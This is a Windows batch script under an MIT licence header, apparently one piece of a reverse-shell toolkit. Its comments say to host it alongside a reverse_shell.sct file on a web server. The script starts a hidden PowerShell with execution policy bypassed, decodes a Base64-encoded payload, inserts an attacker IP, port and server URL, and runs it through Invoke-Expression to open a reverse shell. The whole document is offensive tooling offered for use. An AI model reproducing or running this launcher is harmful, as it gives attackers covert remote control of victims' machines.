#########################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
########################################################################################################################################################################################

# Replace <Base64_encoded_string> with the actual Base64 encoded string from the previous step.
# Host both run_reverse_shell.bat and reverse_shell.sct on a web server. Ensure they are accessible via HTTP or HTTPS, e.g
# http://yourserver.com/run_reverse_shell.bat and http://yourserver.com/reverse_shell.sct.

@echo off
set ip=%1
set port=%2
set serverUrl=http://yourserver.com

powershell -NoP -NonI -W Hidden -Exec Bypass -Command ^
  "$encodedScript = '<Base64_encoded_string>'; ^
  $decodedScript = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedScript)); ^
  Invoke-Expression ($decodedScript -replace '\$ip', '%ip%' -replace '\$port', '%port%' -replace '\$serverUrl', '%serverUrl%')"

